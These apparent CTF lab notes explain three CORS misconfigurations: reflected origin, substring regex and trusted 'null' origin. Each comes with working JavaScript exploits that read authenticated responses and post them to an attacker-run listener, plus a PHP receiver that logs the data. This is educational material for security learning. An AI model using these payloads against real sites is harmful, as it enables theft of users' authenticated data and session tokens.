# **CORS Exploitation**

## 1. **Arbitrary Origin Vulnerability**

```php
Access-Control-Allow-Origin: <user-controlled Origin>
Access-Control-Allow-Credentials: true
```

**Issue:**

* Server reflects Origin without validation
* Any domain becomes trusted

### 1.1 **Core Idea**

> If you control Origin and server reflects it → you can read authenticated responses.

![Arbitrary Origin Vulnerability Attack Flow](/img/CORS_SOP/1.png)

### 1.2 **Attack Flow**

A bit different from the above diagram.

1. Victim visits attacker page
2. JS sends request to target with:

   ```txt
   Origin: attacker.com
   Cookies included
   ```

3. Server reflects Origin
4. Browser allows response access
5. JS reads response
6. Data sent to attacker server

### 1.3 **Exploit**

```html
<html>
  <head>
  <title>Data Exfiltrator Exploit</title>
  <script>
    //Function which will make CORS request to target application web page to grab the HTTP response
    function exploit() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var all = this.responseText;
        exfiltrate(all);
     }
    };
    xhttp.open("GET", "http://corssop.thm/arbitrary.php", true); //Replace the URL with target endpoint
    xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
    xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhttp.withCredentials = true;
    xhttp.send();
    }

    function exfiltrate(data_all) {
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "http://10.49.80.25:81/receiver.php", true); //Replace the URL with attacker controlled Server

          xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
          xhr.withCredentials = true;
          var body = data_all;
          var aBody = new Uint8Array(body.length);
          for (var i = 0; i < aBody.length; i++)
            aBody[i] = body.charCodeAt(i);
          xhr.send(new Blob([aBody]));
    }
    </script>
</head>
<body onload="exploit()">
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
<textarea id="load" style="width: 1183px; height: 305px;">
```

Below is the `receiver.php` file on the listening server:

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header("Access-Control-Allow-Credentials: true");

$postdata = file_get_contents("php://input");
file_put_contents("data.txt", $postdata);
?>
```

Make sure that `data.txt` is writable by the web server to avoid permission issues.

### 1.4 **What to Check (CTF)**

* Send request with:

  ```txt
  Origin: attacker.com
  ```

* Look for:

  ```txt
  Access-Control-Allow-Origin: attacker.com
  Access-Control-Allow-Credentials: true
  ```

If both present → exploitable

### 1.5 **Requirements**

* Victim authenticated (cookies)
* ACAO reflects origin
* Credentials enabled

### 1.6 **Impact**

* Read API responses
* Steal user data / tokens
* Full data exfiltration

---

## 2. **Bad Regex in Origin**

```php
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

**Issue:**

* Regex checks **substring**, not exact match
* Any origin *containing* `corssop.thm` is allowed

### 2.1 **Bypass Idea**

Valid origin:

```txt
http://corssop.thm
```

Malicious origin:

```txt
http://corssop.thm.evilcors.thm
```

**Why it works:**

* Regex `#corssop.thm#` matches substring
* Server treats attacker domain as trusted

### 2.2 **Core Idea**

> Weak regex = attacker-controlled domain passes validation → CORS trust bypass

![Bad Regex in Origin Attack Flow](/img/CORS_SOP/2.png)

### 2.3 **Attack Flow**

1. Attacker hosts exploit on:

   ```txt
   http://corssop.thm.evilcors.thm
   ```

2. Victim visits attacker page

3. JS sends request to:

   ```txt
   corssop.thm/badregex.php
   ```

   with:

   ```txt
   Origin: http://corssop.thm.evilcors.thm
   Cookies included
   ```

4. Server regex matches → allows origin

5. Browser allows response access

6. JS reads response

7. Data exfiltrated to attacker server

### 2.4 **Exploit (Reuse Same Code)**

Only change target:

```javascript
x.open("GET", "http://corssop.thm/badregex.php", true);
```

Everything else stays the same.

### 2.5 **Common Regex Mistakes**

* `example.com$` → allows `badexample.com`
* `example.com` → allows `example.com.attacker.com`
* Missing anchors (`^`, `$`)
* Using substring match instead of exact match

---

## 3. **NULL Origin**

```php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
```

**Issue:**

* Server explicitly trusts `"null"` origin
* `"null"` is not a normal domain → comes from special contexts

### **Where "null" Origin Comes From**

* `file://` (local files)
* `data:` URLs
* sandboxed iframes (`<iframe sandbox>`)
* some restricted browser contexts

### 3.1 **Core Idea**

> If server trusts `"null"`, attacker can force browser to send requests from a null-origin context and read responses.

Normal attacker page:

* Origin = `evil.com` → not allowed

So attacker creates:

* **iframe with data URL**
* This runs JS in **null origin**

Now:

```txt
Origin: null
```

Server allows it → CORS bypass

### 3.3 **Attack Flow**

1. Victim loads attacker-controlled page (or XSS payload)

2. Page creates iframe with `data:` URL

3. JS inside iframe runs with:

   ```txt
   Origin: null
   ```

4. Script sends request to:

   ```txt
   corssop.thm/null.php
   ```

   with cookies

5. Server allows `"null"` origin

6. Browser allows response access

7. JS reads response

8. Data exfiltrated to attacker server

### 3.4 **Exploit**

```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
  <iframe id="exploitFrame" style="display:none;"></iframe>
  <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
</div>

<script>
  // JavaScript code for the exploit, adapted for inclusion in a data URL
  var exploitCode = `
    <script>
      function exploit() {
        var xhttp = new XMLHttpRequest();
        xhttp.open("GET", "http://corssop.thm/null.php", true); // Replace target
        xhttp.withCredentials = true;

        xhttp.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {

            // Exfiltration function
            var exfiltrate = function (data) {
              var xhr = new XMLHttpRequest();
              xhr.open("POST", "http://10.49.95.61:81/receiver.php", true); // Replace listener
              xhr.withCredentials = true;

              var body = data;
              var aBody = new Uint8Array(body.length);

              for (var i = 0; i < aBody.length; i++) {
                aBody[i] = body.charCodeAt(i);
              }

              xhr.send(new Blob([aBody]));
            };

            exfiltrate(this.responseText);
          }
        };

        xhttp.send();
      }

      exploit();
    <\/script>
  `;

  // Encode the exploit code for use in a data URL
  var encodedExploit = btoa(exploitCode);

  // Set the iframe's src to the data URL containing the exploit
  document.getElementById("exploitFrame").src =
    "data:text/html;base64," + encodedExploit;
</script>
```

### 3.5 **XSS + CORS (Lab Context)**

The exact delivery method (direct XSS payload stored on the site, or sending a victim a malicious URL/phishing) doesn’t change the CORS/SOP weakness being demonstrated. The lab shows three exploit paths (arbitrary-origin, bad-regex, null-origin via stored XSS). Any technique that causes the victim’s browser to issue the cross-origin request described will let you observe and exfiltrate the response.

### 3.6 **What to Check (CTF)**

* Response contains:

  ```txt
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```

→ Try null-origin exploit (iframe / data URL)

### 3.7 **Requirements**

* Server trusts `"null"`
* Credentials enabled
* Victim authenticated
* Ability to execute JS (attacker page or XSS)

---
